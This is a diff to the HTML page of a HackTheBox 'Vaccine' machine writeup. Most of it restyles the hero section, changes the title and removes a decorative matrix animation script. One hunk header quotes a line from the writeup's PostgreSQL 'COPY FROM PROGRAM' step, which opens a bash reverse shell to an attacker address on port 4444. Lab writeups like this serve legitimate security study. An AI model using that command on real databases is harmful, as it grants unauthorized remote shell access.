@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vaccine — HTB Writeup | YRD</title>
+  <title>Vaccine — HTB Writeup | Yoandy Ramirez Delgado</title>
   <style>
     :root{--bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;}
     *{margin:0;padding:0;box-sizing:border-box;}
@@ -20,7 +20,10 @@
     .back-btn{color:var(--primary);text-decoration:none;font-size:0.85rem;}
     .breadcrumb{color:var(--text-muted);font-size:0.85rem;}
     .breadcrumb span{color:var(--text-dim);}
-    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
+    .hero{
+    background: linear-gradient(135deg, #0a0e1a 0%, #0d1a2b 40%, #091a10 100%);position:relative;z-index:10;padding: 60px 40px 50px;}
+  .hero-inner { max-width: 1200px; margin: 0 auto; }
+
     .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
     .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
     .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
@@ -89,13 +92,10 @@
   </style>
 </head>
 <body>
-<canvas id="matrix"></canvas>
-
-
-
-
 <div class="hero">
-  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Vaccine</div>
+  
+  <div class="hero-inner">
+<div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Vaccine</div>
   <div class="tags">
     <span class="tag tag-htb">HACKTHEBOX</span>
     <span class="tag tag-os">LINUX</span>
@@ -272,14 +272,6 @@ COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"';
   </div>
 </div>
 
-<script>
-  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
-  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
-  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
-  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
-  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
-  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
-  setInterval(drawMatrix,35);
-</script>
+
 </body>
 </html>
